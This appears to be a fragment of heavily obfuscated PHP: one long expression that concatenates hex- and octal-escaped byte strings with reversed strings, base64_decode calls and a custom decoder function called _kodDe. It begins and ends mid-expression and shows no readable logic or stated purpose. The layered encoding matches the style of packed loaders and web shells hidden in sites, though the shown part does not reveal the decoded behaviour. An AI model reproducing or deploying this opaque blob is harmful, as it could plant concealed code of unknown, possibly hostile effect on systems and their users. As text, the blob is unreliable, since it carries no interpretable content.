\xd1\x23\x2b\xf6\xae\xdc\xb2\x77\xd9\xf9\xa4\xcf\x1f\x6f\xd9\xf6\xe1\xf6\x47\x3f\x5a\x79\xdb\x9e\xcd\xd7\xee\x5d\xfd\xc0\x47\x6b\xfe\x82\x33\x3e\xd9\xb0\x75\xcf\x65\xb7\xb1\x8e"."\111\237\134\375\310\336\25\267\354\135\165\347\336\345\233\367\74\170\365\236\207\227\354\271\377\176\7\250\375\311\205\313\77\332\276\171\357\45\253\367\256\77\157\357\275"."\x4b\xf7\xae\x5d\xbe\xe7\xb2\x1b\xf7\x5c\x77\xdb\x47\x2b\xb6\xec\xb9\xe9\x82\x3d\x17\x2d\xff\x78\xcb\xaa\x91\x76\xe0\xc1\xf1\x39\x74\xfa\x89\xde\x80\x7b\x5e\x87\x51\x52\x84\xa7\xb4"."\303\50\205\323\131\14\176\213\240\172\67\370\245\232\254\0\344\202\320\14\254\245\326\153\67\227\20\243\304\150\273\4\103\5\4\152\106\37\32\304\350\233\306\303\310"."\x42\xa6\x70\xc8\x5e\x2c\x24\x6b\x2e\x74\x4a\xe8\x4c\x9d\x37\x58\x1b\xf0\xd5\x78\x89\x2\x31\x5b\xa8\x31\x48\x37\x95\xa8\x1f\x80\xd4\x60\x60\x26\xb\x33\x9b\xa1\x1c\x53\x7b\xa9\x88"."\x2\x70\xb1\x64\x19\x88\xec\x2\x9c\x4b\x26\x99\x42\x9d\x95\xa\xa0\x46\x50\x81\x3\xe2\x74\x44\x3\x4a\x5\xf0\x4c\x2\x9\x4a\x14\x6c\xb7\x22\x68\x7a\x8b\x94\x19\xb\x67\x17\x3a"."\xca\x1c\xe3\x8a\x25\x62\x87\x8f\x6b\x10\xbb\x7b\xa9\x80\xa8\xb4\xb2\x7a\x96\x8f\x38\x22\x96\xd8\x38\x47\x59\xb1\x54\x90\xee\x29\x20\xfd\xe2\xf3\xa\x7a\x1f\xc6\x25\xd\x49\x76\x14"."\x91\xe\x8b\xdd\xe5\x65\x1\x2\x34\x4c\x5d\x56\x1\x61\x28\x45\x1d\x2c\x89\xd5\x7\xbf\x16\x5b\xfa\xa8\x8b\xd7\xc0\xeb\x4\x4a\xd8\xd3\x24\x4f\x4b\x9d\xb5\x24\x36\xc1\x6f\x2d\x94".strrev('E Ù-Ü“a-I¬o[kCpJTQ“,ª2eš¨™<ìµŠX°¹—ùàäTä')."\x52\xd1\x52\xc1\x54\xbc\x5a\xb4\xac\x6\x86\x1\x16\x7\x97\x7\x1\x96\xd3\xa3\x64\x79\x4b\x0\x5\xb1\xc\xba\x82\x30\x9d\x2d\x62\x9e\x3c\xe4\x1b\xa1\x0\xd3\x54\x78\x9c\x49\xa3"."\213\242\67\142\223\337\74\233\215\201\302\262\104\117\176\346\131\1\32\27\171\103\265\215\30\312\203\2\230\307\42\143\54\200\312\247\123\262\200\10\143\57\110\71\274"."\135\40\102\30\216\312\371\132\352\375\201\146\154\124\23\254\155\364\66\173\134\4\161\143\110\300\345\41\345\42\125\111\205\20\363\341\244\102\313\364\243\17\321\51\13".base64_decode('oa+CfRU2AY2CZyHdRTpDVl9CNpYyqlJViE2WSZPMEYg/EAqDCSDoWcC6hcIJ').base64_decode('IejRQtuQPkpRd8pRwI5TcVmE+gsBjcM2a/0t9T5qP1QXseTVBXzQTJZ8ljN9')."\x5c\xb9\x2\x44\xd2\x54\x96\x9\xc2\xdc\x44\x14\x66\xb0\x13\x1d\x44\xf8\x81\xe\x73\x4\xb7\x25\xf0\x33\xc1\x16\x16\xe6\x84\x21\x88\x40\x7d\x46\x8e\x5b\xdb\xeb\x58\xb8\x91\x99\xf6"."\301\14\177\100\210\170\2\236\346\40\213\6\332\1\256\206\151\202\211\133\263\47\30\2\243\152\151\153\346\370\274\311\63\23\200\202\237\223\34\24\27\27\271\112\252".strrev('o;‘Ç¿“p¦ìå˜bœ°—“PÊLT\\M!Î0]Ì>i3Ÿâ°;‹')."\x2a\xc6\x69\x77\x69\x8e\x4\x88\xd0\x10\x27\x42\xd\x7a\x30\x31\x58\x97\x0\x84\x4a\xd8\x2a\x50\x6a\xf1\xb7\x7b\xb8\x6f\xe\x21\x3\xa7\x10\x63\x44\x89\x7b\xec\x70\xcf\x9b\xd3\xd1".strrev('Eş4£©kÆŒ]hN±È;ç+=mIğá.Ì…¨¾”HÕÔåÛŸ1€Táß')."\x21\x92\xa\x80\x2f\x4c\x27\xa8\x81\xe\xb6\xc\xa\x77\x2c\xec\x18\xdb\xe1\x74\x61\x63\x28\x48\x95\x74\x38\x78\x97\xc2\xde\x59\xe0\x20\xd\x6\x2d\x96\x5c\x61\xe4\x6d\x82\xb4\xe".base64_decode('BktCeGviyDTyQxiWaWQKSHR6FVtT79kLW8DfhtBCL/jbBH6aQmDVVFYA7Lsm')."\337\14\357\102\370\17\317\50\146\23\211\255\41\254\25\174\55\13\301\277\0\213\54\364\265\330\33\253\361\206\332\275\136\134\200\206\311\57\57\12\260\12\31\252\340"."\165\347\54\77\65\344\223\232\274\365\41\11\306\151\67\302\341\42\64\231\316\271\245\305\341\260\333\150\43\140\303\314\246\213\12\107\217\53\44\7\205\47\130\313\121"."\254\5\40\162\141\1\51\175\133\1\201\171\221\41\361\206\200\277\255\125\210\67\172\146\372\132\32\150\314\135\102\103\45\324\233\105\235\57\10\246\250\226\2\43\167"."\156\43\306\11\125\211\150\37\221\234\265\100\166\35\100\337\40\42\320\342\220\312\307\350\327\272\331\152\332\174\115\165\242\361\52\54\110\116\15\204\272\311\301\61\206"."\x76\x8e\xc6\x91\x19\x2b\x8d\xc0\x29\xa7\x61\x4\x6e\x34\x82\xe6\x80\x46\xf0\x4\xd0\x18\x9a\x2e\x1a\x41\x4e\x74\x68\x4\xd\x94\x46\x20\xdb\xe1\x6d\xa1\x79\x80\x8f\x3\x3c\x18\x65"."\316\272\270\56\160\134\356\143\206\130\123\143\21\301\236\32\142\142\27\226\226\101\43\173\300\3\312\114\376\150\23\43\42\251\216\300\125\143\375\76\111\260\7\205\362"."\110\101\22\343\306\45\0\261\211\312\200\337\216\371\325\210\30\236\117\101\26\333\40\232\41\325\114\130\76\112\314\226\300\107\175\310\354\113\370\54\71\316\271\200\6"."\213\172\303\232\40\375\305\362\140\42\32\345\242\17\53\127\304\60\322\174\306\354\20\273\155\7\371\325\371\260\254\132\222\60\205\300\301\221\370\247\203\224\245\322\1"."\x62\x17\x55\xe8\x20\x7\xac\xcf\x1f\x6e\x2\xc7\x46\x58\xe4\x19\x7d\x7e\x22\x52\x70\x45\x44\xc3\xdf\x30\xb7\x1f\x76\xc9\x5c\x57\xd1\xd4\x33\x82\x33\x1e\xa4\xb7\x8\x96\xd1\xc3\xcd".strrev('nSRTjÄÈ—®dÅ'."\n".'•ÙŒ.jDÁ<BLï0T¥	Vªo0°°"eå”™').base64_decode('qSDKk+WYoIQo0S8jeV/K6kkHgEQiDE1rAcETVnj/k4phsCsBRADQoBnndo2i').strrev('M‰â”.ÇÉi"­“—Øß>4"DôĞC8›?Î¹:4‚.°*äT”™W:º Ã').base64_decode('3DUQlF7xNudSIpUPclBN22VZKa1V0ZMqEsu1c6Vtli/URrrx2u9NbiYFvtDK')."\126\326\71\216\26\246\16\341\20\300\110\214\124\143\232\310\140\111\121\135\101\171\26\141\15\322\254\116\4\373\43\155\235\63\65\255\131\116\145\103\332\114\125\41\140".base64_decode('Wudvb2nyU48n1B0SQVnkShCwO7qLRkwa0GXy5XZ6pEHRmOAkb6QIA2gxOUx6')."\2\265\215\200\30\15\327\373\0\15\356\235\25\342\15\64\202\252\200\274\25\226\111\110\155\246\167\361\0\267\102\44\326\244\165\261\315\13\220\24\361\202\141\331\300"."\76\77\251\353\122\240\322\71\126\105\206\106\2\254\42\366\367\360\237\53\265\11\236\244\206\330\233\171\353\325\222\202\354\203\72\142\50\376\363\7\3\12\47\263\101"."\x35\xa4\xe3\xff\x1f\x2b\x71\x9f\x66\xe8\x4b\xa8\x92\x80\xb7\x6c\x75\x10\x0\x61\x9d\x69\xb2\xd6\x71\x92\xcd\xcd\xf7\x1\xb2\x4\xfc\x43\x23\x38\x53\xfd\x81\xd9\x64\xf8\x46\xc8\x82"."\377\260\244\320\215\54\205\10\205\60\25\335\265\70\321\344\20\252\143\1\100\172\54\104\357\332\210\73\11\56\2\367\340\237\331\311\230\23\164\225\334\241\305\24\223".strrev('AÂëøf¯¯[Ñ™\'C‡Ì†I;s)ø•Ÿr;ú’†IVvœå}Ãñ™')."\177\133\200\112\355\140\34\331\152\5\274\265\263\231\60\215\245\326\173\146\332\123\40\324\207\74\15\171\223\31\307\4\323\21\115\22\16\370\41\343\350\155\252\267\125"."\10\66\62\157\107\326\264\160\223\257\145\106\336\214\220\77\334\54\124\301\211\276\220\267\331\236\146\155\41\350\205\73\226\307\153\232\374\265\102\266\317\237\73\23\200"."\x10\xb2\x25\x62\xfe\x13\x27\x2\x42\xba\x63\x1\xa2\x3e\x2a\x1\x11\x12\x5b\x8\x49\x57\x67\x18\x50\xbe\xd5\x1d\x8b\x8a\x8b\x3a\xdc\xd5\xae\x12\xc6\x78\x61\xc\x22\x98\x19\xd\x91"."\154\120\114\17\317\4\12\151\270\24\211\271\135\56\322\46\13\0\116\220\271\212\240\170\222\170\224\13\142\243\172\313\107\155\146\262\324\142\317\145\167\300\344\303\242".base64_decode('8nBwdpBNLoa8fPkWcMLFxFsjW2Hwt1UsCq9b8xa0wKPFNktMcqkaB32+R2Na')."\x34\x3\xed\xf6\xf9\x4\xf3\x73\x4\x24\xb9\xf8\x19\x4a\xb7\x19\x13\x9\x90\x53\xc4\x29\xfa\xde\x83\x73\x2a\x92\x3\xb1\x88\xed\x48\x20\x9\xfc\x36\x56\x38\x38\x78\x62\x39\x55\x32"."\x98\xed\x4c\x3a\x63\x1d\xa1\x6\xe8\x49\xa8\xe3\x1c\xd6\x41\x55\x17\x5c\xf9\x44\xb5\x54\x4c\x15\xec\x2\xe5\x28\x3d\xf9\x33\xd1\x1e\x6a\xa5\x84\x30\x94\xe1\xec\x57\xe9\x14\x8c\x66"."\126\377\344\72\65\54\43\7\27\141\121\317\240\327\151\250\135\51\247\234\350\322\0\25\20\117\322\124\271\307\222\317\335\112\245\265\204\112\275\173\364\72\301\47\204"."\x3c\x5c\x18\x34\x4e\x31\x3b\xbc\xa3\x61\xbe\xb8\x60\xc4\x60\x31\x11\x2e\x10\x26\x64\xb7\x7e\x10\xdf\x36\xda\xc0\x90\x25\x32\x4f\x61\x41\x34\x88\x4a\xa9\x82\xb8\xbf\xab\x7\xe4\x98"."\140\334\102\35\232\161\13\121\170\240\43\217\157\70\352\220\270\63\115\312\140\346\247\66\40\63\43\130\353\120\34\221\354\341\127\312\311\36\166\363\24\265\234\222\360".base64_decode('QKoXbp75QUg8V4K8miy9viW2NTVZeJLlkGTQXFN0/ulpD1Y4G5s9tU6A6con').base64_decode('TGTnTUcIHDgUluR+o4ISvjildKIUB5NPgCTX49Zoq4s5nIgdRgHWKwZv5ChJ')."\x83\x53\x6d\xc0\x83\x13\x39\x91\x8e\xe3\xd8\x11\x9\xbd\x6e\x8e\xcb\xac\xc3\x70\x18\x38\x94\xef\xbb\xb3\xf2\x7e\x77\x56\xbe\xef\xce\xb2\x7d\x77\x56\xee\x77\x71\x92\xd\x48\xe5\x74"._kodDe('MgKmoKedABF1FhUUMtmy43DOexGpHk1+nfd9w1DWTbIaB7awKC4inJMYMaW59A==')."\152\212\121\4\157\120\4\237\220\15\23\222\276\377\27\176\341\240\141\170\63\243\307\31\21\345\326\14\303\15\175\340\40\322\221\135\230\373\203\124\300\146\35\23\366"."\x14\x2d\xb0\x7f\xc4\x41\x7\x73\x51\xc6\x1c\x98\x71\x2f\x67\x58\x2e\x82\xc3\x5e\x66\xf9\xd\x28\x60\x4f\x97\x12\x54\x20\x6a\x23\xb3\xe2\x1d\x48\x6b\x86\x22\x7a\xda\x8b\x29\xc8\x27".base64_decode('EzPtE7zTJeUBiHyoHoHgp466cBMd4sAJcyYtDjIHnGDoNr9uhqL0UE5HoIYZ').base64_decode('d9rK/LXZh6NabO45RtS5gz8kQXfmTXAKZrMYLwgOH0EPyUdgh8lOjqNZorwt').strrev('—ÒË,à¶è\'grêf‰îhèhë¶y°^Û:›©d¡b»V®w:øß\'9ş')."\xdf\xf3\xbd\x47\x84\x43\x63\xf3\x7a\xdb\x23\x99\x88\xf4\x75\xeb\x48\x95\xca\xd1\x1f\x66\x70\x8a\xbc\x30\xe7\x81\xd4\xb3\x61\x3a\x81\xd5\x4e\xae\x6e\x93\xce\x8\xee\xc0\x45\xe8\x80"."\347\64\163\336\14\171\131\354\362\220\42\10\344\212\220\370\54\145\276\1\301\364\244\152\264\30\71\364\26\24\0\270\53\250\54\30\135\4\176\213\13\34\5\220\144"."\x42\x71\xb8\x52\x30\x1\xf5\xa3\xa0\x72\x74\x11\xa\x14\x13\xfb\xf1\x41\xaa\xda\xca\x7d\x7f\xf1\x7b\x9\xc2\xc5\x56\xcb\xa6\x29\x88\xd1\xaa\xd1\x6c\xc0\x9d\x5e\xee\x2e\x77\xf7\x93".strrev('Mñ½ÉÇ>iéœP&ë›„ŠÖFœÅÖdâA-Qfª9 @ş1ÛÈ¿İ_İ')."\253\36\110\46\44\302\356\124\25\216\163\225\25\112\324\147\165\125\141\133\250\336\71\271\260\172\372\141\323\152\221\174\335\124\232\241\200\34\172\72\304\174\347\164\42"."\x5\x9b\x6\x37\x13\x8b\xb8\xad\xb1\xa1\xea\x12\x9c\x94\x94\x7\xb5\x14\x38\xd8\x0\x3e\x4a\xba\xa2\x64\x32\xdb\x18\xce\xe2\xe\x12\x53\x8a\xd9\xaf\xe9\xe4\xf2\x80\xa0\xd3\x72\xaa"."\xf0\x1c\x17\x30\x4d\xd2\x20\x7b\xc\x9b\xb5\x57\x42\xb1\x18\x1d\x7e\x5b\x3a\x9b\x49\x39\x21\xf7\xeb\xc\x8a\x2e\x66\x6c\x9e\x58\xcb\xac\xe5\x21\xff\x6a\x2d\x2f\x22\xc2\x28\x47\x11"."\x49\x1e\xc4\x9e\x73\x2b\x25\xd1\x9d\xb2\xe0\x7e\xce\x9\x29\x0\xbc\xf3\xa8\x28\x85\xa4\x41\x1c\x49\x93\x54\xd1\x99\x1f\x85\x6b\x88\x0\xc3\x56\x4\x78\xa6\xad\xbf\x70\xaa\x9d\x80"."\xaa\x82\xf0\xf\x36\x15\x38\x6c\x4d\x25\x5f\x11\xab\xcf\x5e\xbb\x27\x5f\xfb\x2c\xa0\x2a\x70\x71\x9d\xa2\x8b\xe0\x1\x40\x52\xc3\x6c\xe8\x63\xd4\x9\xd7\xd7\xa9\xc6\x86\xca\xe1\x9b"."\72\157\127\243\4\124\362\25\151\313\250\61\373\47\321\175\215\63\223\241\37\314\333\250\110\360\323\2\150\20\76\326\236\205\364\6\234\271\223\121\333\166\352\135\20"."\127\346\172\351\4\233\127\52\37\137\71\141\112\45\325\201\37\113\257\233\62\151\263\212\5\251\27\317\221\356\116\212\7\270\203\137\72\66\270\340\26\327\245\102\62"."\237\106\266\303\51\2\261\224\343\275\265\270\207\46\3\305\234\244\340\260\25\311\125\361\116\202\367\257\141\346\371\66\17\46\215\51\175\364\264\44\207\245\240\263\312"."\26\244\213\6\164\126\136\346\133\44\222\350\341\43\211\100\15\67\2\341\75\240\243\32\47\252\320\261\52\10\61\243\361\114\252\247\112\310\224\114\115\223\222\162\52"."\113\310\375\61\106\345\30\143\52\374\120\325\30\127\105\247\1\42\4\137\63\77\146\360\34\341\316\205\260\133\2\222\203\245\310\56\350\126\332\5\17\251\100\106\124"."\373\5\247\221\115\355\127\174\162\243\65\221\141\136\207\323\50\114\6\321\332\324\326\340\153\21\156\225\205\204\160\155\135\113\330\323\332\232\67\203\121\60\120\230\5"."\x2f\x60\x5c\xdd\xd4\xb1\x7e\x94\x2\xde\x34\x35\xd9\x25\x45\xa1\x12\x67\x55\x1\x4c\x2d\x90\xc\x3d\x4a\x1d\xbe\x15\xb8\x9\xaa\x45\x5\x38\xf\x35\x4d\x25\x55\xa\x61\x15\xa9\x13".base64_decode('jMmJQji7cPo0tzqdrQd3yqBrXEfV5R4FOSo3vLBNjYUAIF4aodR67oJBkqbJ')."\22\236\352\252\102\170\233\326\131\50\305\301\221\315\124\122\246\333\53\267\320\233\213\151\156\131\314\204\233\57\240\121\172\230\161\125\175\114\204\234\127\66\356\211\332"."\274\6\327\312\251\231\271\125\140\343\256\150\276\54\67\142\374\335\234\127\264\170\103\262\136\22\60\271\172\36\140\160\61\237\374\151\71\332\3\201\215\237\14\270\240".strrev('ˆA\'µZO,ö5'."\n".'#MÊ-$ÜÁ{³îuUä(ø.èuÂšÜ|Xg^B´d‹')._kodDe('LJmjaDOZjRVz7MD+C1SfkBO9NKcm4iZq/OP9uio1jsdnnkJAVZ2Tw1apFGE8kg==')."\73\12\254\165\135\254\64\216\167\270\254\345\101\317\311\124\263\202\44\301\136\22\223\222\147\221\115\166\230\273\204\353\306\263\233\146\11\136\77\127\125\115\237\303\156"."\26\346\322\74\112\17\252\343\46\323\345\36\214\73\103\355\54\130\333\302\51\136\6\314\30\157\270\220\150\304\143\165\130\127\335\307\134\112\213\312\257\70\354\111\247"."\xc5\x28\x75\xa9\x8e\x64\xde\x9\x35\xe2\x66\xbb\x1a\xcb\xc1\x5d\x51\xae\x24\x4e\x8b\x20\x9c\x62\x4b\x87\xd7\xc4\xb6\xc\x68\xcc\x80\x92\xfb\x0\x5e\x4\x4\x58\xb7\x3d\x1d\xb4\xc5".strrev('¤™]çÆÈsƒü'."\0".'\\€QE¾‰‘q“î[¼ä˜íøGÁi´ÕÕš`Y')."\x2b\x89\xaa\x2\xd4\x5d\x23\xae\x28\xa0\x3e\x42\x25\xf9\x3e\x2\x2a\x16\x48\x14\xb\x26\x65\x36\x63\xba\xa9\x81\x33\x90\xe9\x3c\x13\xbf\xfb\x6d\x1\xa2\x65\xea\x69\x21\x37\xb\x84"."\272\32\65\17\377\216\36\305\360\76\174\350\41\241\350\130\225\16\141\27\164\327\324\311\345\127\344\31\200\326\200\77\344\257\245\16\325\363\11\272\52\50\51\153\140"."\xfd\x7a\xce\xf2\x50\x35\xe7\x19\xde\xd9\xd6\x12\x8c\x38\x70\x93\x14\xb2\xfc\x7a\x26\x95\x62\x97\xf9\x90\x5a\x64\x27\x18\xbe\xa9\x9\xc6\x33\x26\x3f\xfb\xa0\x47\xd4\x10\x34\x13\x32"."\110\262\340\10\11\272\141\122\142\56\113\44\117\61\174\231\16\33\241\173\300\42\254\300\315\47\64\352\376\251\274\254\254\314\131\66\16\374\317\56\21\11\271\125\111".strrev('ªªªÏ`—6Ô-Q¡•5IãÁé'."\n".'+ô'."\n".'BìRÓ`9­d¬Dœè•ee"…f-')."\50\25\100\7\0\146\20\231\66\125\322\255\77\125\340\344\246\112\350\232\212\304\24\373\64\260\373\77\262\50\364\170\200\173\235\206\1\151\2\26\10\115\13\351\61"."\xb3\x36\x0\xc5\xf8\xd2\x83\x7e\x78\x53\x31\xc2\x73\x4c\xc5\xc6\x1c\x55\xe2\xc7\x5c\x74\x7a\xc5\x44\xf1\x1e\xc9\xf2\x55\x50\xe\x9c\x86\x51\xd6\x61\x98\x20\x48\x27\x90\x45\x17\x53"."\xd7\x47\xb1\x4\xb3\xf3\x83\xd1\x16\x56\x14\x3b\x51\xc6\x56\x4b\x64\xb4\x79\xa0\x27\xae\xf5\x87\xf9\xc9\x6\xa3\x67\xb1\x18\x1a\x3c\xe4\x4d\x28\xc8\xb0\x61\x92\x19\xa0\x38\x8f\x82"."\10\275\147\46\327\326\310\262\255\107\115\130\154\172\302\102\333\242\7\140\200\132\40\5\113\327\17\13\315\311\7\40\145\343\342\113\217\134\37\242\47\150\260\46\113".base64_decode('5WHC5OkaN7PJea+JxgSjOCpADv4HVQma4qUJWLmglvl8EhqwZ9nqeGLCU0IG').base64_decode('d/ZUy/y6iR6g8GWscGVvEMej/PaVttEncAmutK51gSk3xLGC9Nb8yax4bsk8')."\x85\xd8\x80\xc4\x72\x62\x22\xd4\x7\xa2\xaf\xda\x10\xe8\xe1\xe6\x3b\x32\x7f\x6f\x4b\x28\xca\xad\x63\x84\x44\xab\xc6\x8e\x90\x51\xcb\x1c\xac\x8b\x89\x90\xeb\x10\xef\xdb\x91\x6d\xa4"."\265\15\310\316\130\123\130\317\176\7\126\50\33\152\222\27\220\4\323\53\122\214\53\50\101\21\201\50\266\124\65\172\225\17\147\203\337\272\131\323\163\240\214\154\5"."\212\371\360\136\261\346\275\177\321\225\64\160\65\55\5\7\317\244\121\242\120\26\16\74\54\162\332\160\273\64\262\327\172\362\200\213\25\44\162\326\36\211\154\141\3"."\225\14\77\10\61\300\103\120\362\43\106\373\333\233\121\50\311\44\40\23\311\344\250\4\366\11\252\277\306\165\315\64\105\263\126\117\114\300\200\115\342\201\31\302\125"."\x9c\xd3\xf9\x77\x2c\x77\x38\x82\x43\x45\x56\x14\x20\x6d\xfa\x75\x99\x62\x6b\xa4\x19\xe3\x42\xfe\x5e\x39\x45\x6f\x8b\xda\xb5\x67\x10\x76\x36\x29\xfe\xa5\x9e\x28\x53\xcc\xb1\x3e\x5c"."\316\240\240\312\220\347\13\244\22\253\102\16\15\135\211\152\72\142\351\4\243\277\224\31\120\272\304\150\223\306\130\131\170\147\240\344\151\2\32\141\13\300\11\241\0"."\x30\x59\x19\xd1\xa4\x5b\x70\x64\x9\x62\x82\xf7\x51\xe1\x24\x77\x8e\x93\x18\x9\x10\xc6\x2d\xe3\x48\xa9\x90\x81\xca\xe7\xa3\x6\x6c\x32\x17\x41\x5f\x11\xf1\x90\xc1\x4c\x84\x89\xb7".base64_decode('bSc01YaUxFOS6jTCBpC5LRyBIeaBZqHrPD4ysQr6Zk4VnAdPNq78KOYYgBmB')."\x53\x35\x74\x4e\x9e\x4f\xa1\x2c\x61\x46\xa3\xf4\xe0\x25\x97\x68\xb3\xf9\x24\x91\x8c\xac\x42\x15\xa4\x9c\xe3\xca\x9d\xd4\x97\x81\xa8\x17\x49\x8e\x46\x32\xbf\x90\x78\x14\xc0\x0\x92"."\xb8\x14\x83\x11\x6d\x27\x52\x8e\x97\xd1\x84\xc7\x7b\x90\x69\x2a\xb7\xff\x43\x56\xb8\x6c\x3d\x91\xb9\x2e\x8b\xe9\xc2\x89\xa3\x30\x4d\x28\x64\xb7\x2a\xa2\x15\x7e\x91\x8b\x15\xa4\x60"."\201\266\174\371\170\206\140\166\235\105\177\314\126\0\354\14\153\76\361\110\232\264\274\302\10\340\300\242\243\140\153\204\370\242\25\275\256\242\132\174\34\134\25\17\44"."\151\330\357\251\60\61\374\102\32\133\364\122\35\102\206\227\170\162\110\143\211\271\227\332\56\246\103\111\54\105\310\53\71\105\305\320\122\304\42\100\150\316\62\215\177".base64_decode('sJI98HxkimyGGKG5DDgNSwTrhVhqsyRWql+hDlco49va2OpmSTV0mpjtJuGa')."\370\273\53\104\101\212\130\135\364\203\171\327\372\311\6\253\255\144\252\62\364\125\307\376\244\32\225\232\374\15\276\132\117\123\235\57\70\103\202\256\5\370\165\75\122"."\173\266\156\167\44\363\301\213\103\41\77\302\34\355\302\240\63\2\310\102\147\214\221\303\6\47\174\5\15\32\301\353\274\265\131\14\243\212\236\323\42\40\243\223\126".base64_decode('hIDqQElWntIJLuARCqd1Jbd8VkFPM/IeCxUyeXpDyuf/Atgi1tLgsFZSQ3Ve')."\x4d\xf5\xa9\x86\xca\x91\x3\xad\x91\x15\x5b\xe7\xb2\x3a\x9d\xb9\x87\x16\x26\x3d\x26\x7a\x80\xe6\x93\x8d\xbf\x22\x1a\xdc\xdb\x79\x4f\xb1\x84\xa8\x6\x89\x97\x49\xf4\x76\x92\xa6\xc2"."\x69\xf2\xdc\x8\xf7\xcd\x8d\xa2\x82\xd7\xf4\xb4\x2e\xab\x86\x22\x24\x60\xf7\xdd\x25\xc5\x34\x26\x78\x46\x21\xb5\xc3\xb8\xe\x4e\xb\xc0\xa7\xa\xff\xd7\x8d\xab\x31\xee\x90\xc0\xd6"."\65\65\106\257\264\231\156\73\366\221\133\53\276\230\102\273\220\343\332\375\77\72\211\167\10\136\57\220\301\70\325\66\104\357\265\222\313\6\166\221\33\306\256\53\370"."\x27\x0\xdb\xa4\x67\xd3\xe2\x85\x88\x3b\x46\xdf\xe6\xa1\x8c\x1a\xf4\xd1\xe2\xa5\xe2\x4f\x18\xe1\xf4\x29\x2c\x4e\x5a\x83\x9f\xc3\x1c\xa\xe0\x97\xe0\xcd\x0\xa5\x64\xa9\x2c\x2\x6c"."\x68\x32\xed\x96\xb\x41\x9b\xbb\x7b\xbb\x6\x9c\xe5\x7d\xc2\x9c\x6f\x40\x9d\xa4\xa1\xdb\x1\xf5\x24\xce\xa6\xb3\x2\x52\x95\x54\x86\xe4\x3f\xfc\x5\x4\x69\x1a\x35\xb3\xe1\x9f\x40".base64_decode('/g+8ybRpYcKI3isvbHlXElEfnHOB+hVaMpuTYGHpm2i/mA4W9Lec6tTEaUAI').base64_decode('EJwj+PUNqHiMQ5jtcwBCXDFzfb7jdoZs1LAfIZycAUghCJh/6+scMEUgXixI')."\331\372\55\230\43\0\63\62\266\24\114\127\350\57\64\341\267\70\333\27\132\37\203\177\72\310\57\305\362\366\246\361\276\46\135\51\146\153\137\153\171\57\131\110\150"."\126\70\47\206\152\301\313\156\71\305\320\26\361\166\317\136\341\340\333\213\346\11\40\205\336\173\250\33\242\252\55\131\262\272\337\346\136\315\371\11\144\365\104\315\256"."\267\230\352\23\122\101\23\375\212\207\264\220\334\345\300\264\17\304\100\74\126\223\25\303\242\266\37\32\64\310\244\62\221\30\203\200\351\102\1\372\140\106\314\201\136"."\x73\xc0\x78\xc8\xfe\x62\x88\xb0\x7f\x18\x72\x13\x6b\x77\x25\xb4\x88\x9c\x8\x60\x9d\x19\x8b\xce\xb9\xe\xf8\x16\xa6\x11\x67\x29\x86\x93\xdc\x72\x3a\x3d\xa4\xcc\x9d\xd0\x23\x58\xfe"."\236\111\371\260\55\223\45\125\27\370\42\121\337\22\337\64\160\63\16\122\34\174\255\25\137\55\220\141\213\115\322\353\35\364\3\71\247\172\341\225\76\167\356\165\20"."\xd4\xe9\xa1\xe4\x8d\xa0\xfc\x46\x6e\xe4\x5c\x22\xe3\x42\xa\x48\xd3\x24\xbe\xc0\x96\xd\xa\x1\x2\xee\x7a\x14\x40\xbb\x5e\x24\x74\x7f\x27\x95\xc1\xa1\xf5\x4d\x19\xc\xb0\xe8\xa7"."\116\351\144\124\77\214\163\236\120\64\346\344\67\304\366\167\54\350\147\330\243\34\16\74\62\376\56\22\176\202\303\301\236\333\160\140\167\66\16\362\310\206\203\233\343"."\374\336\263\64\374\361\55\353\213\135\260\317\114\133\54\207\374\266\123\336\154\252\154\25\2\366\211\13\151\271\222\64\176\11\226\312\44\371\35\43\210\130\71\221\234"."\x1\xb\x23\xcc\xe8\x9\x7\xba\x2\x74\x50\xdf\x25\xb6\xe9\xe0\xa3\x12\x57\x26\xcf\x1c\xfe\xe7\x36\xb0\xd2\x20\x62\x2f\x62\x56\xac\x53\x39\x2d\xa2\xd3\x6b\x15\x7b\x31\xd5\x2\x75".base64_decode('gKnnWuvYuVKOb//ZyVj5+AlTRDaerw+/riAu7qiPSfxDTnS+8JIVrCTq2Enc')."\xbe\x28\xd3\xaa\xd6\x99\xfb\x28\x8e\x0\xa2\x56\x94\xfc\xbf\xdb\xa\x9c\x28\xc6\x45\x5\x75\xcb\xdc\x17\xbf\x72\xa6\x4\x41\xa5\xa0\x9a\x20\x1c\x68\xb6\xcb\x66\xd\xde\x1\x1b\xbc"."\xb3\xf8\x8\xe3\x8f\xe2\x58\xbf\x85\x9f\x70\xca\x33\xe\xe1\x20\xe2\x5b\x3\xbf\xb7\xa2\x25\x20\x7b\x99\x84\xc2\x4d\x53\x97\xad\x7c\x52\x3e\x76\x0\xcd\x4\xe5\x3d\x54\xf4\xb4\x9c"."\142\357\73\232\30\42\110\340\331\2\277\40\266\150\152\166\51\10\254\16\17\52\44\204\363\247\22\344\330\205\166\207\174\223\375\337\55\40\145\11\60\127\301\125\14"."\xf2\x8c\xdc\x7d\x26\x45\x24\xb6\xf7\x6a\x6c\xf\x8e\xfd\x4e\xbf\x31\xd1\xc5\xd8\x1f\xa7\x4c\xdf\xc0\x41\x8b\x2a\x48\xce\x14\xd3\x8f\x16\x98\x50\x2f\x9c\x1b\xb3\x8e\xd5\xd6\x3c\xa8".strrev('hšqÁ[ìµ^Ñ£…‚È#›ø­ŠY˜!§sSkÉGpóï	…K”*†ë˜ÛÆ')."\20\202\32\22\267\101\156\323\110\76\102\372\113\66\56\172\352\35\351\147\170\32\230\331\217\54\150\200\300\251\23\336\234\322\304\260\325\212\326\117\135\133\1\42\311"."\xc2\x68\x81\x78\x9d\xed\x59\x32\x84\x7c\xec\x6f\x95\xd1\xf1\xa3\x7d\xce\x71\x9a\x60\x3f\x66\x61\x7\xd8\xe3\x1c\x16\xf6\xc0\xb0\xbf\x52\x3\xc8\x29\xd1\x5f\x1c\x88\x32\x8\x27\x87".base64_decode('J8F6SP8Wf004G/kxyENDvVlpfdAyLnYLugywbWtqrgetH/H9CUH8yHEYDlNK')."\374\377\371\345\272\377\137\17\326\115\50\243\102\145\313\253\146\15\204\300\245\324\330\240\340\55\20\13\64\155\343\260\36\221\303\305\134\2\241\16\113\214\104\370\206"."\203\147\217\313\366\266\247\213\51\44\122\27\23\324\363\204\114\57\114\144\370\116\117\216\200\222\276\157\5\40\262\207\75\277\224\57\222\373\370\240\5\370\50\275\311"."\273\231\122\243\75\171\56\340\340\22\64\131\175\353\11\124\102\116\61\216\237\0\61\101\235\152\270\151\50\12\331\54\110\112\122\264\50\232\213\371\323\224\41